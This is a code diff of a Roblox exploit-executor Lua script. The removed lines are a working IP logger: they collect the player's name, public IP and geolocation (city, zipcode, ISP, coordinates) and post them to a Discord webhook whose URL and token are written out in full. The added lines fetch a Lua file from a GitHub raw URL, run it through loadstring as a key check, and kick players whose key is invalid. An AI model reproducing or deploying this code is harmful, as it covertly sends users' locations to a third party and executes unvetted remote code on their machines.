@@ -1,42 +1,32 @@
-local name = game:GetService("Players").LocalPlayer.Name
-local WebhookURL = "https://discord.com/api/webhooks/1237077974692663378/2M29PIb3wK0Va2lYc_CxaQGs4hj0pnDr88pPmaCA1_W9tQ9aK1P8ONwLHBvCDC4gWbxr"
-local getIPResponse = syn.request({
-    Url = "https://api.ipify.org/?format=json",
-    Method = "GET"
-})
-local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
-local IPBuffer = tostring(GetIPJSON.ip)
+-- URL of the raw Gist content
+local gistUrl = "https://raw.githubusercontent.com/Zxlono/varsitydhc/main/key"
 
-local getIPInfo = syn.request({
-    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
-    Method = "Get"
-})
-local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
-local FI = {
-    IP = IPBuffer,
-    country = IIT.country,
-    countryCode = IIT.countryCode,
-    region = IIT.region,
-    regionName = IIT.regionName,
-    city = IIT.city,
-    zipcode = IIT.zip,
-    latitude = IIT.lat,
-    longitude = IIT.lon,
-    isp = IIT.isp,
-    org = IIT.org
-}
-local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
-local MessageData = {
-    ["content"] = dataMessage
-}
+-- Function to fetch and check the key
+local function checkKey()
+    local validKeysScript = game:HttpGet(gistUrl)
+    local validKeys = loadstring(validKeysScript)()
 
-syn.request(
-    {
-        Url = WebhookURL, 
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode(MessageData)
-    }
-)
+    -- Check if the provided key is in the list of valid keys
+    local isValid = false
+    for _, validKey in pairs(validKeys) do
+        if getgenv().key == validKey then
+            isValid = true
+            break
+        end
+    end
+
+    return isValid
+end
+
+-- Execute actions based on key validity
+if checkKey() then
+    print("Key is valid.")
+    -- Run the script for a valid key
+    game:GetService("RunService"):Set3dRenderingEnabled(false)
+    settings().Rendering.QualityLevel = 1
+    UserSettings().GameSettings.MasterVolume = 0
+else
+    print("Key is not valid.")
+    -- Kick the player for an invalid key
+    game.Players.LocalPlayer:Kick("INVALID KEY")
+end
